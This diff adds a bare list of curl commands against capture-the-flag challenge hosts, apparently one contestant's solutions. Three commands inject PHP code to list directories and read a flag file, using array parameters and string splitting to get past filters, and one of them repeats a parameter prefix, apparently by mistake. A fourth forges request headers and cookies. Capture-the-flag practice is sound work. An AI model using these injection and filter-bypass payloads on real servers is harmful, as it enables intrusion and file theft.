@@ -1,0 +1,9 @@
+curl -d "rce2[]=12123&rce3=print_r(scandir('/'));" http://80-a997745a-c1b5-4f34-aa06-65d2d675f958.challenge.ctfplus.cn/?rce1[]=123
+
+
+curl -d "rce2[]=12123&rce3=print_r(scandir('/flag'));" http://80-a997745a-c1b5-4f34-aa06-65d2d675f958.challenge.ctfplus.cn/?rce1[]=123
+curl -d "rce2[]=12123&rce3=rce3=print_r(file_get_contents('/fl'.'ag'))" http://80-a997745a-c1b5-4f34-aa06-65d2d675f958.challenge.ctfplus.cn/?rce1[]=123
+
+
+
+curl -A "Safari" -H "Referer: www.mihoyo.com" -H "Via: clash" -d "http=good" -b "Sean=god" http://80-95a23249-8263-444a-93e7-a0d59b688e83.challenge.ctfplus.cn/?hello=web
